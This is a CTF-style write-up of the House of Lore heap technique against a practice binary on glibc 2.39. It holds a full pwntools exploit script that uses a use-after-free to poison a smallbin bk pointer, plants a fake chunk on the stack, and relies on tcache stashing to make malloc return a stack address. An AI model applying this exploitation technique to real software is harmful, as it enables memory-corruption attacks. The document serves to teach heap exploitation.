---
title: "House of Lore — Corrupting Smallbin to Make malloc Return a Stack Address"
ctf: "how2heap"
category: "pwn"
difficulty: "easy"
points: null
date: "2026-06-18"
summary: "Poisoning a smallbin's bk pointer via UAF and crafting a fake chunk on the stack to pass the bck->fd check, leveraging tcache stashing to land the fake chunk in tcache and ultimately get malloc to return a stack pointer."
tags:
  - "heap"
  - "smallbin"
  - "tcache"
  - "house-of-lore"
  - "uaf"
  - "glibc-2.39"
  - "fake-chunk"
  - "tcache-stashing"
  - "how2heap"
---
```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall")
libc= ELF("/lib/x86_64-linux-gnu/libc.so.6")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)

    return r

def malloc(idx,size):
    r.sendlineafter(b"> ",b"1")
    r.sendlineafter(b"): ",str(idx).encode())
    r.sendlineafter(b"Size: ",str(size).encode())
    r.recvuntil(b"Heap: ")
    return int(r.recvline(),16)

def free(idx):
    r.sendlineafter(b"> ",b"2")
    r.sendlineafter(b"): ",str(idx).encode())

def edit(idx,data):
    r.sendlineafter(b"> ",b"3")
    r.sendlineafter(b"): ",str(idx).encode())
    r.sendafter(b"Data: ",data)

def show(idx):
    r.sendlineafter(b"> ",b"5")
    r.sendlineafter(b"): ",str(idx).encode())
    r.recvuntil(b"Data: ")
    return r.recv(8)

def stack(offset,data):
    r.sendlineafter(b"> ",b"4")
    r.sendlineafter(b"Offset: ",str(offset).encode())
    r.sendafter(b"Data: ",data)

def main():
    global r
    r = conn()

    # good luck pwning :)
```
    
    we will try to get malloc return chunks on stack via smallbin corrupts
    this is known as house of lore. we need to control 0x20 bytes on the 
    stack and we already have a stack leak.

    since we need to corrupt smallbin metadata we use the UAF edit primitive
    to overwrite fd/bk of a freed chunk. with this we can create our fake
    chunk on the stack and remember this check for later:

        bck->fd == victim

    so our fake chunk's fd must point back to the real victim chunk header
    to pass this check when glibc unlinks from the smallbin.

    let's start — grab the stack leak and prepare our smallbin victim.
```python
    r.recvuntil(b"leak: ")
    stk = int(r.recvline().strip(),16)

    chunkA = malloc(0,0x100)
    gurad  = malloc(1,0x100)

    entry_11 = []
    for i in range(2,9):
        entry_11.append(malloc(i,0x100))

    for i in range(2,9):
        free(i)

    free(0)
```
    now i think we are familiar with what happens: entry_11 fills tcache
    (7 entries) so when we free chunkA of the same size it has nowhere
    to go except the unsorted bin (tcache is full, and 0x110 is too big
    for fastbins).

    later when we malloc a size LARGER than the chunks sitting in the
    unsorted bin, malloc scans the unsorted bin, sees chunkA does not
    fit the request, and sorts it into the appropriate smallbin (0x110).

    here we also need to leak libc from the unsorted bin fd pointer.
```python
    lib = u64(show(0).ljust(8,b"\x00")) - 0x203b20
    log.success(f"LEAK:\nlibc:{hex(lib)}\nstack:{hex(stk)}\n")
    libc.address = lib

```
    to sort chunkA into the smallbin
```python
    malloc(9,0x200)
```
    drain tcache entries so when stashing happens later it will
    help us avoid a crash. we need tcache empty for this size
    so future mallocs hit the smallbin.
```python
    for i in range(2,9):
        malloc(i,0x100)
```
    create our fake chunk on the stack

    prev_size         size
    0000000000000000  0000000000000111
           fd              bk

    fd = address of chunkA header (user_ptr - 0x10)
        this is to bypass the check bck->fd == victim
        when glibc unlinks chunkA it checks bck->fd and our
        fake chunk's fd points right back to chunkA header — passes!

    bk = smallbin head address
        glibc 2.26+ does tcache stashing after popping from a
        smallbin. it walks the bk chain and stuffs same-size chunks
        into tcache. if bk pointed to NULL or garbage it would
        dereference and crash. by pointing bk at the bin head,
        after one stash iteration bin->bk == bin and the loop
        stops — leaving exactly our fake chunk in tcache.
```python
    fake_chunk = p64(0) + p64(0x111) + p64(chunkA-0x10) + p64(lib + 0x203c20)
    stack(0,fake_chunk)
```
```text
    corrupt victim's bk to point to our fake chunk on the stack
    we trash fd (set to 0, doesn't matter for the check).
    now the smallbin layout:


    smallbin_head          chunkA
   ┌───────────────┐      ┌────────────┐
   │ fd ──> chunkA │      │ fd = 0     │ (trashed)
   │ bk ──> chunkA │      │ bk = stack │ (poisoned!)
   └───────────────┘      └───────│────┘
                                  │
               stack_fake <───────┘
             ┌──────────────┐
             │ fd = chunkA  │ (passes bck->fd check)
             │ bk = head    │ (stops stash loop)
             └──────────────┘
```

```python
    edit(0,p64(0) + p64(stk))
```

    first malloc pops the real victim from smallbin:

      victim = bin->bk = chunkA
      bck = victim->bk = stack_fake
      check: bck->fd == victim?  YES (we set fd = chunkA header)
      bin->bk = bck = stack_fake
      bck->fd = bin

    then tcache stashing kicks in:

      tc_victim = bin->bk = stack_fake
      bck = stack_fake->bk = bin_head
      bin->bk = bin_head
      tcache_put(stack_fake)   <-- fake moves into tcache!
      loop: bin->bk == bin? YES -> stop
```python
    malloc(10,0x100)
```
    second malloc — tcache has our fake chunk, returns it.
    we now have a heap pointer that lives on the stack!
```python
    stack_frm = malloc(11,0x100)
    log.success(f"stack chunk on: {hex(stack_frm)} expected: {hex(stk+0x10)}")
```
    finally we finish the house of lore

```python
    r.interactive()

if __name__ == "__main__":
    main()
```
